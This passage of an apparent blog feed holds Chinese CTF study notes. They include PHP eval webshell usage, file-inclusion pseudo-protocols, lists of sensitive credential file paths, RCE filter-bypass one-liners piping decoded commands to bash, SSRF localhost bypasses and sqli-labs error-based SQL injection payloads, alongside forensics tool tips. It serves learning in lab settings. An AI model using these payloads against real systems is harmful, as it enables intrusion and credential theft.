id="内容读取"><a href="#内容读取" class="headerlink" title="内容读取"></a>内容读取</h2><p>file_get_content()可以读取php:&#x2F;&#x2F;filter伪协议。</p><p><a href="https://so.csdn.net/so/search?q=file_get_contents&spm=1001.2101.3001.7020">file_get_contents</a>、highlight_file() ，show_source()</p><p>readfile(&#x2F;tmp&#x2F;flagoefiu4r93)</p><p>scandir可以扫描目录（需要打印）</p><h2 id="弱比较-x3D-x3D"><a href="#弱比较-x3D-x3D" class="headerlink" title="弱比较 &#x3D;&#x3D;"></a>弱比较 &#x3D;&#x3D;</h2><blockquote><p>使用=&#x3D;比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true=&#x3D;0或true=&#x3D;false或true&#x3D;&#x3D;null）</p></blockquote><h1 id="python相关"><a href="#python相关" class="headerlink" title="python相关"></a>python相关</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>查看config：</p> 可以获取当前设置，如果题目是这样的：<blockquote><p>app.config [‘FLAG’] &#x3D; os.environ.pop（’FLAG’）</p></blockquote><p>可以直接访问  或者  得到 flag。</p><p>同样可以找到 config。</p><pre><code class="python">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</code></pre><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p><a href="https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501">https://blog.csdn.net/giaogiao123/article/details/119513378?spm=1001.2014.3001.5501</a></p><p>我们平常的认知都是去写入一句话木马到一个php文件或者是jsp文件，然后连接那个文件的目录，实际上，不需要写入文件，我们照样可以利用eval函数造成一句话的形成最后拿下网站webshell</p><pre><code>&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c = $_GET[&#39;c&#39;];        eval($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p><strong>eval()函数在执行时其中有多个函数，则第一个必须执行正确，第一个以后也必须是函数，但是正确与否都可以执行。</strong></p><pre><code>eval(&#39;phpinfo();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//成功执行eval(&#39;asdasdsa();phpinfo();fdsfsdfds&#39;.&#39;asdasdsa();&#39;);//执行失败</code></pre><pre><code>http://localhost/12.php?c=@eval($_POST[cmd]);  不行</code></pre><pre><code>http://localhost/12.php?c=echo 1;@eval($_POST[cmd]);  行</code></pre><p>再第二种情况下，我们可以使用蚁剑连接</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="参考步骤"><a href="#参考步骤" class="headerlink" title="参考步骤"></a>参考步骤</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><ul><li>查看通道二维码</li><li>查看内嵌文件 stegseek、zsteg 分离 binwalk</li></ul><h3 id="未知文件"><a href="#未知文件" class="headerlink" title="未知文件"></a>未知文件</h3><ul><li><p>winhex 看文件头修改后缀</p><ul><li><p>core：string |grep</p></li><li><p>pdf：文件分离等 foremost</p></li></ul></li></ul><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><ul><li><p>直接find</p></li><li><p>提取文件 foremost -t all -i </p></li><li><p>过滤本网络查看异常</p></li></ul><h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><ul><li><p>如果flag存在于流量中，那么把包传入winhex，直接搜索flag等关键字</p></li><li><p>http contains “shell”</p></li></ul><h2 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h2><p><a href="https://blog.csdn.net/weixin_39934520/article/details/121959797">心仪的公司_心仪的公司攻防_红烧兔纸的博客-CSDN博客</a></p><blockquote><p>ip.addr &#x3D; 192.168.1.0&#x2F;24过滤内网ip</p><p>192.168.1.111大量访问外网，猜测是192.168.1.108做反向代理攻击过滤192.168.1.108追踪tcp流得到filag</p></blockquote><p><a href="https://blog.csdn.net/MrTreebook/article/details/123442355">攻防世界 Misc 心仪的公司-CSDN博客</a></p><pre><code>strings webshell.pcapng | grep &quot;&#123;&quot;</code></pre><p><a href="https://blog.csdn.net/l8947943/article/details/122692365">xctf攻防世界 MISC高手进阶区 low_攻防世界low-CSDN博客</a></p><p>用画图工具打开bmp图片，其次将其另存为png格式。接着使用stegsolve打开图片</p><h2 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h2><p>假设，有一个名为 lxk.py 的源文件：</p><p>print(“Hello Python!”)<br>要编译为 *.pyc 文件，需要引入 Python 中的模块 py_compile，在交互模式下输入：</p><pre><code>&gt;&gt;&gt; import py_compile&gt;&gt;&gt; py_compile.compile(&quot;lxk.py&quot;)</code></pre><h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><p>命令行下：<strong>python -m py_compile test.p</strong></p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>首先安装库 <code>uncompyle:  pip install uncompyle</code></p><p>命令行下：uncompyle6 test.pyc &gt; test1.py </p><h2 id="formost-分离文件"><a href="#formost-分离文件" class="headerlink" title="formost 分离文件"></a>formost 分离文件</h2><p>c:&gt; foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>]<br>    [-b <size>] [-c <file>] [-o <dir>] [-i &lt;file]</p><blockquote><p>-V  - 显示版权信息并退出<br>-t  - 指定文件类型.  (-t jpeg,pdf …)<br>-d  - 打开间接块检测 (针对UNIX文件系统)<br>-i  - 指定输入文件 (默认为标准输入)<br>-a  - 写入所有的文件头部, 不执行错误检测(损坏文件)<br>-w  - 向磁盘写入审计文件，不写入任何检测到的文件<br>-o  - 设置输出目录 (默认为.&#x2F;output)<br>-c  - 设置配置文件 (默认为foremost.conf)<br>-q  - 启用快速模式. 在512字节边界执行搜索.<br>-Q  - 启用安静模式. 禁用输出消息.<br>-v  - 详细模式. 向屏幕上记录所有消息。</p></blockquote><p>foremost -i 分离隐藏文件</p><p>foremost -t 需要恢复文件类型后缀(如jpg) -i 扫描的分区 -o 指定存放文件的目录</p><p>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</p><blockquote><p>这个例子中，命令 <code>foremost -t all -i f9809647382a42e5bfb64d7d447b4099.pcap</code> 将尝试从名为 <code>f9809647382a42e5bfb64d7d447b4099.pcap</code> 的 PCAP 文件中找回所有可能的文件类型。这些文件将会被提取并保存到指定的输出目录中。</p></blockquote><p>zsteg:</p><p>zsteg stego100.png</p><h2 id="binwalk-检索隐写"><a href="#binwalk-检索隐写" class="headerlink" title="binwalk 检索隐写"></a>binwalk 检索隐写</h2><p>binwalk xxx</p><h3 id="常见文件头"><a href="#常见文件头" class="headerlink" title="常见文件头:"></a>常见文件头:</h3><pre><code>JPEG (jpg)，文件头：FF D8 FFPNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0aGIF (gif)，文件头：47 49 46 38Windows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00python反编译文件pyc的头：03 F3 0D 0A  （实验吧，py的交易会用到）pyd的文件头：4D 5A 90 00ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件rar文件: 52 61 72 217z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）MS Word/Excel (xls.or.doc)，文件头：D0CF11E0CAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864</code></pre><h2 id="Core文件简介"><a href="#Core文件简介" class="headerlink" title="Core文件简介"></a>Core文件简介</h2><p>Core文件其实就是内存的映像，当程序崩溃时，存储内存的相应信息，主用用于对程序进行调试。当程序崩溃时便会产生core文件，其实准确的应该说是core dump 文件,默认生成位置与可执行程序位于同一目录下，文件名为core.<em><strong>,其中</strong></em>是某一数字。</p><p>我们可以使用strings命令查看字符串内容<br><a href="https://blog.csdn.net/stpeace/article/details/46641069">strings命令</a>打印文件中可打印的字符</p><h2 id="分解合并图片"><a href="#分解合并图片" class="headerlink" title="分解合并图片"></a>分解合并图片</h2><p><a href="https://cloud.tencent.com/developer/article/1910472">【愚公系列】2021年11月 攻防世界-进阶题-MISC-019(glance-50)-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>kali 的 convert 命令可以分解图片：</p><p>convert glance.gif flag.png</p><p>montage合并图片</p><pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png</code></pre><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote><ol><li>把当前目录下的所有.png格式的图片拼起来</li></ol><p>montage.exe *.png -geometry +0+0 -background #00000000 big.png</p><ol start="2"><li>把当前目录和所有子目录下的.png格式的图片拼起来</li></ol><p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -background #00000000 big.png</p><p>拼图时会自动调整行列上的图片数，如果需要指定，加上参数-tile，例:</p><p>dir &#x2F;b &#x2F;s *.png &gt; filelist.txt<br>montage.exe @filelist.txt -geometry +0+0 -tile 2x4 -background #00000000 big.png</p><p>原文链接：<a href="https://blog.csdn.net/zaffix/article/details/7058587">https://blog.csdn.net/zaffix/article/details/7058587</a></p></blockquote><p><a href="https://blog.csdn.net/zz_Caleb/article/details/89490494">攻防世界-Misc-glance-50(convert分离gif、montage图片拼接)-mma-ctf-2nd-2016-CSDN博客</a></p><blockquote><p>convert glance.gif flag.png</p><p>montage flag*.png -tile x1 -geometry +0+0 flag.png</p><p>-tile是拼接时每行和每列的图片数，这里用x1，就是只一行</p><p>-geometry是首选每个图和边框尺寸，我们边框为0，图照原始尺寸即可</p></blockquote><h3 id="gaps"><a href="#gaps" class="headerlink" title="gaps"></a>gaps</h3><blockquote><p>–image 指向拼图的路径</p><p>–size 拼图块的像素尺寸</p><p>–generations 遗传算法的代的数量</p><p>–population 个体数量</p><p>–verbose 每一代训练结束后展示最佳结果</p><p>–save 将拼图还原为图像</p></blockquote><pre><code>gaps --image=test.png --generation=30 --population=300 --size=120</code></pre><p>size比较重要，这里影响着图片数量，图片数量要和本来的图片数相等</p><blockquote><h1 id="Creating-puzzles-from-images"><a href="#Creating-puzzles-from-images" class="headerlink" title="Creating puzzles from images"></a>Creating puzzles from images</h1><p>To create puzzle from image use <code>gaps create</code></p><pre><code>gaps create images/pillars.jpg puzzle.jpg --size=64</code></pre><p>will create puzzle with 240 pieces from <code>images/pillars.jpg</code> where each piece is 64x64 pixels.</p><p>Run <code>gaps create --help</code> for detailed help.</p><p>注：根据给定的拼图大小，创建的拼图图像尺寸可能小于原始图像。从原始图像中裁剪出最大可能的矩形。</p></blockquote><blockquote><h1 id="Solving-puzzles"><a href="#Solving-puzzles" class="headerlink" title="Solving puzzles"></a>Solving puzzles</h1><p>In order to solve puzzles, use <code>gaps run</code>:</p><pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600</code></pre><p>This will start genetic algorithm with initial population of 600 and 20 generations.</p><p>Following options are provided:</p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td><code>--size</code></td><td>拼图大小（像素）</td></tr><tr><td><code>--generations</code></td><td>遗传算法的代数</td></tr><tr><td><code>--population</code></td><td>Number of individuals in population</td></tr><tr><td><code>--debug</code></td><td>Show the best solution after each generation</td></tr></tbody></table><p>Run <code>gaps run --help</code> for detailed help.</p></blockquote><blockquote><h2 id="Size-detection"><a href="#Size-detection" class="headerlink" title="Size detection"></a>Size detection</h2><p>If you don’t explicitly provide <code>--size</code> argument to <code>gaps run</code>, piece size will be detected automatically.</p><p>However, you can always provide <code>gaps run</code> with <code>--size</code> argument explicitly:</p><pre><code>gaps run puzzle.jpg solution.jpg --generations=20 --population=600 --size=48</code></pre></blockquote><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><p>有时候不同压缩工具解压的结果有差异，需要都试试</p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="伪协议："><a href="#伪协议：" class="headerlink" title="伪协议："></a>伪协议：</h2><p>php:&#x2F;&#x2F;input伪协议以POST传参</p><p>data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><pre><code>php://filter/convert.iconv.UTF-7.UCS-4*/resource=xxx.php</code></pre><h2 id="iconv"><a href="#iconv" class="headerlink" title="iconv:"></a>iconv:</h2><pre><code>UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*</code></pre><p><strong>windows常见的敏感文件路径:</strong></p><pre><code class="cobol">C:\boot.ini //查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini //Mysql配置C:\Program Files\mysql\data\mysql\user.MYD //Mysql rootC:\Windows\php.ini //php配置信息C:\Windows\my.ini //Mysql配置信息C:\Windows\win.ini //Windows系统的一个基本系统配置文件</code></pre><p><strong>Linux常见的敏感文件路径:</strong></p><pre><code>/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_ras.keystore/root/.ssh/known_hosts //记录每个访问计算机用户的公钥/etc/passwd/etc/shadow/etc/my.cnf //mysql配置文件/etc/httpd/conf/httpd.conf //apache配置文件/root/.bash_history //用户历史命令记录文件/root/.mysql_history //mysql历史命令记录文件/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数- /etc/passwd- /proc/self/cmdline，用于获取当前启动进程的完整命令。- /proc/self/maps获取堆栈分布- /proc/self/mem得到进程的内存内容</code></pre><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><pre><code>cat fl*  用匹配任意 cat fla 用*匹配任意ca\t fla\g.php        反斜线绕过cat fl&#39;&#39;ag.php        两个单引号绕过echo &quot;Y2F0IGZsYWcucGhw&quot; | base64 -d | bash      //base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数echo &quot;63617420666c61672e706870&quot; | xxd -r -p | bash       //hex编码绕过(引号可以去掉)echo &quot;63617420666c61672e706870&quot; | xxd -r -p | sh     //sh的效果和bash一样cat fl[a]g.php       用[]匹配a=fl;b=ag;cat $a$b          变量替换cp fla&#123;g.php,G&#125;    把flag.php复制为flaGca$&#123;21&#125;t a.txt     利用空变量  使用$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10)(小于 10 也是可以的) 因为在没有传参的情况下，上面的特殊变量都是为空的 </code></pre><h1 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h1><p>常见的网站源码备份文件后缀:</p><p>tar.gz，zip，rar，tar</p><p>常见的网站源码备份文件名：</p><p>web，website，backup，back，www，wwwroot，temp</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>127.0.0.1被禁止访问，则可以尝试各种变形</p><pre><code>?url=http://@127.0.0.1:8000@/api/internal/secret?url=http://2130706433:8000/api/internal/secret?url=http://0x7f.0x0.0x0.0x1:8000/api/internal/secret?url=http://[::127.0.0.1]:8000/api/internal/secret?url=http://127。0。0。1:8000/api/internal/secret?url=http://127.1:8000/api/internal/secret?url=http://0.0.0.0:8000/api/internal/secret?url=http://127.127.127.127:8000/api/internal/secret</code></pre><p>127.0.0.1&#x3D;0.0.0.0&#x3D;127.127.127.127</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="cyberchef"><a href="#cyberchef" class="headerlink" title="cyberchef:"></a>cyberchef:</h2><p>affine:仿射密码</p><p>bacon：培根密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SQL&quot;&gt;&lt;a href=&quot;#SQL&quot; class=&quot;headerlink&quot; title=&quot;SQL&quot;&gt;&lt;/a&gt;SQL&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/l2872253606/article/details/1233624</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://taninluv.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Windows_Privilege_Escalation</title>
    <link href="https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/"/>
    <id>https://taninluv.github.io/2023/10/24/Windows-Privilege-Escalation/</id>
    <published>2023-10-24T12:47:13.000Z</published>
    <updated>2023-10-24T12:58:40.421Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息枚举"><a href="#信息枚举" class="headerlink" title="信息枚举"></a>信息枚举</h1><h2 id="查看arp缓存"><a href="#查看arp缓存" class="headerlink" title="查看arp缓存"></a>查看arp缓存</h2><pre><code>arp -a</code></pre><h2 id="查看路由表"><a href="#查看路由表" class="headerlink" title="查看路由表"></a>查看路由表</h2><pre><code>route print</code></pre><h2 id="powershell-查看Windows-Defender-状态"><a href="#powershell-查看Windows-Defender-状态" class="headerlink" title="powershell:查看Windows Defender 状态"></a>powershell:查看Windows Defender 状态</h2><pre><code>Get-MpComputerStatus</code></pre><h2 id="ps-列出应用锁程序规则"><a href="#ps-列出应用锁程序规则" class="headerlink" title="ps:列出应用锁程序规则"></a>ps:列出应用锁程序规则</h2><pre><code class="powershell-session">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre><h2 id="测试AppLocker策略"><a href="#测试AppLocker策略" class="headerlink" title="测试AppLocker策略"></a>测试AppLocker策略</h2><pre><code class="powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User EveryoneFilePath                    PolicyDecision MatchingRule--------                    -------------- ------------C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息枚举&quot;&gt;&lt;a href=&quot;#信息枚举&quot; class=&quot;headerlink&quot; title=&quot;信息枚举&quot;&gt;&lt;/a&gt;信息枚举&lt;/h1&gt;&lt;h2 id=&quot;查看arp缓存&quot;&gt;&lt;a href=&quot;#查看arp缓存&quot; class=&quot;headerlink&quot; title=&quot;查看a</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="Windows" scheme="https://taninluv.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>sqli-lab_pass</title>
    <link href="https://taninluv.github.io/2023/10/20/sqli-lab-pass/"/>
    <id>https://taninluv.github.io/2023/10/20/sqli-lab-pass/</id>
    <published>2023-10-20T08:18:51.000Z</published>
    <updated>2023-12-04T08:01:13.475Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">从0到1完全掌握 SQL 注入 | Drunkbaby’s Blog (drun1baby.top)</a></p><h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h1><p><a href="https://www.pianshen.com/article/3739146098/">mysql中information_schema说明 - 程序员大本营 (pianshen.com)</a></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803755.png" alt="image-20231020172620307"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803757.png" alt="image-20231020172716074"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803758.png" alt="image-20231020172740361"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202310211803760.png" alt="image-20231020172751913"></p><p><a href="https://blog.csdn.net/cplvfx/article/details/108292814">information_schema.columns字段说明，获取数据库表所有列信息-CSDN博客</a></p><h1 id="mysql中的连接函数"><a href="#mysql中的连接函数" class="headerlink" title="mysql中的连接函数"></a>mysql中的连接函数</h1><p><a href="https://blog.csdn.net/qq_34292479/article/details/86500185">详解MySQL中CONCAT()函数的用法（链接字符串）_mysql concat-CSDN博客</a></p><p><a href="https://blog.csdn.net/liu_feng_zi_/article/details/106863688">SQL学习笔记——limit用法（limit使用一个参数，limit使用两个参数）_limit参数-CSDN博客</a></p><h1 id="SUBSTR-、Ascii"><a href="#SUBSTR-、Ascii" class="headerlink" title="SUBSTR()、Ascii()"></a>SUBSTR()、Ascii()</h1><p><a href="https://zhuanlan.zhihu.com/p/110142732">MySQL|SUBSTR() 函数用法 - 知乎 (zhihu.com)</a></p><p><a href="https://www.yiibai.com/sqlserver/sql-server-ascii-function.html">SQL Server Ascii()函数 - SQL Server教程 (yiibai.com)</a></p><h1 id="extractvalue-、updatexml-、floor-报错注入"><a href="#extractvalue-、updatexml-、floor-报错注入" class="headerlink" title="extractvalue()、updatexml()、floor()报错注入"></a>extractvalue()、updatexml()、floor()报错注入</h1><p><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用-CSDN博客</a></p><p><a href="https://blog.csdn.net/weixin_46634468/article/details/120692475">【精选】SQL报错型注入原理-详细讲解 extractvalue()、updatexml()、floor() 的报错原因-CSDN博客</a></p><p>如果<code>extractvalue()</code>爆出的字段数不够，在条件中加入not来去除已经查询到的数据，然后显示未查询到的</p><p>such as：</p><pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;,&#39;user&#39;,&#39;avatar&#39;,&#39;last_login&#39;,&#39;failed_login&#39;)))) --</code></pre><p><code>extractvalue()</code>第二个参数似乎只能注入<code>concat()</code>（-笔者目前所知），但是<code>concat()</code>的参数可以嵌套<code>group_concat()</code>:</p><pre><code>127.0.0.1/Less-5/?id=1&#39;%20 union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p>也可已使用用<code>substring()</code>函数截取</p><pre><code>select (extractvalue(1,concat(0x7e,substring(hex((select database())),1,32))));</code></pre><p>经过测试，<code>updatexml()</code>也是可以和上面这样的嵌套</p><pre><code>http://127.0.0.1/Less-5/?id=1%27%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20users%20where%20username%20not%20in%20(%22Angelina%22,%22Dummy%22,%22secure,stup%22)),0x7e),1)%20--+</code></pre><p>同样的情况下，应该可以使用<code>floor()</code>(但是根据上方博客的测试内容，rand()产生的伪随机数列011011001，需要运行到第三次产生异常导致报错，所以笔者预估需要数据库中至少三个数据才能使用floor()报错注入):</p><pre><code>“select * from users where id=‘1’ and ( select 1 from ( select count(),concat( ( select schema_name from information_schema.schemata limit 0,1 ), floor( rand( 0 )2 ) ) x from information_schema.schemata group by x ) b ) --+ ’ LIMIT 0,1”</code></pre><h1 id="left-、right"><a href="#left-、right" class="headerlink" title="left()、right()"></a>left()、right()</h1><p><a href="https://blog.csdn.net/m0_69860228/article/details/124897306">SQL中常用的字符串LEFT函数和RIGHT函数详解_数据库left_Java架构狮的博客-CSDN博客</a></p><h1 id="limit和offset"><a href="#limit和offset" class="headerlink" title="limit和offset"></a>limit和offset</h1><p><a href="https://zhuanlan.zhihu.com/p/116007156">MYSQL|limit和offset用法 - 知乎 (zhihu.com)</a></p><h1 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h1><p><a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">MySQL讲义第 36 讲——select 查询之 INTO OUTFILE参数_select into outfile-CSDN博客</a></p><h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p><a href="https://blog.csdn.net/weixin_43096078/article/details/108215076">SQL注入中，注释#、 –+、 –%20、 %23到底是什么意思？sqli-labs-master-CSDN博客</a></p><p>在get请求中使用<code>--+</code>而在post请求中使用<code>#</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/&quot;&gt;从0到1完全掌握 SQL </summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="sqli-lab" scheme="https://taninluv.github.io/tags/sqli-lab/"/>
    
  </entry>
  
</feed>
